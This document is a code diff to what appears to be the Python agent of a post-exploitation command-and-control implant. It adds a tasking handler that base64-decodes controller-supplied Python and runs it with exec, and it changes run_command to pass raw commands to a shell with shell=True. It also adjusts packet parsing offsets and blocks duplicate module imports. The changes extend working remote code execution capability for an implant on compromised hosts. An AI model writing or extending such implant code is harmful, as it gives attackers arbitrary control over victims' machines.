@@ -136,7 +136,7 @@ def build_response_packet(taskingID, packetData, resultID=0):
     resultID = struct.pack('=H', resultID)
     
     if packetData:
-        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8',errors='ignore'))
+        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
             
@@ -205,7 +205,7 @@ def process_tasking(data):
         if result:
             resultPackets += result
 
-        packetOffset = 8 + length
+        packetOffset = 12 + length
 
         while remainingData and remainingData != '':
             (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
@@ -213,7 +213,7 @@ def process_tasking(data):
             if result:
                 resultPackets += result
 
-            packetOffset += 8 + length
+            packetOffset += 12 + length
         
         # send_message() is patched in from the listener module
         send_message(resultPackets)
@@ -421,6 +421,21 @@ def process_packet(packetType, data, resultID):
         # TODO: implement job structure
         pass
 
+    elif packetType == 121:
+        #base64 decode the script and execute
+        script = base64.b64decode(data)
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(script, '<string>', 'exec')
+            exec code_obj in globals()
+            sys.stdout = sys.__stdout__
+            result = str(buffer.getvalue())
+            return build_response_packet(121, result, resultID)
+        except Exception as e:
+            errorData = str(buffer.getvalue())
+            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+
     elif packetType == 122:
         #base64 decode and decompress the data
         try:
@@ -437,9 +452,12 @@ def process_packet(packetType, data, resultID):
 
         zdata = dec_data['data']
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        moduleRepo[fileName] = zf
-        install_hook(fileName)
-        send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
+        if fileName in moduleRepo.keys():
+            send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
+        else:
+            moduleRepo[fileName] = zf
+            install_hook(fileName)
+            send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
 
     elif packetType == 123:
         #view loaded modules
@@ -837,32 +855,8 @@ def data_webserver(data, ip, port, serveCount):
 
 # additional implementation methods
 def run_command(command):
-    if "|" in command:
-        command_parts = command.split('|')
-    elif ">" in command or ">>" in command or "<" in command or "<<" in command:
-        p = subprocess.Popen(command,stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-        return ''.join(list(iter(p.stdout.readline, b'')))
-    else:
-        command_parts = []
-        command_parts.append(command)
-    i = 0
-    p = {}
-    for command_part in command_parts:
-        command_part = command_part.strip()
-        if i == 0:
-            p[i]=subprocess.Popen(shlex.split(command_part),stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        else:
-            p[i]=subprocess.Popen(shlex.split(command_part),stdin=p[i-1].stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        i = i +1
-    (output, err) = p[i-1].communicate()
-    exit_code = p[0].wait()
-    if exit_code != 0:
-        errorStr =  "Shell Output: " + str(output) + '\n'
-        errorStr += "Shell Error: " + str(err) + '\n'
-        return errorStr
-    else:
-        return str(output)
-
+    p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+    return p.communicate()[0].strip()
 
 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
